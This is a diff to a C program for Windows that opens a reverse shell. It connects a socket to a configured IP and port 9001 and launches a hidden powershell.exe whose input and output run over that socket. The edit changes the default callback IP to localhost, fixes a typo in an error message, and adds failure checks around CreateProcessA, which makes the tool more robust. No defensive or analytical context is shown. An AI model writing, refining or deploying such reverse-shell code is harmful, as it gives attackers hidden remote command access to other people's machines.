@@ -8,7 +8,7 @@
 #include <string.h>
 
 #if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
-# define CLIENT_IP (char*)"192.168.2.228"
+# define CLIENT_IP (char*)"127.0.0.1"
 # define CLIENT_PORT (int)9001
 #endif
 /* ================================================== */
@@ -21,7 +21,7 @@ int main(void) {
 
 	WSADATA wsaData;
 	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
-		write(2, "[ERROR] WSASturtup failed.\n", 27);
+		write(2, "[ERROR] WSAStartup failed.\n", 27);
 		return (1);
 	}
 
@@ -51,7 +51,11 @@ int main(void) {
 	sinfo.hStdOutput = (HANDLE)sockt;
 	sinfo.hStdError = (HANDLE)sockt;
 	PROCESS_INFORMATION pinfo;
-	CreateProcessA(NULL, "powershell.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
+	
+	if (CreateProcessA(NULL, "powershell.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo) == 0) {
+		write(2, "[ERROR] CreateProcessA failed.\n", 31);
+		return (1);
+	}
 
 	return (0);
 }
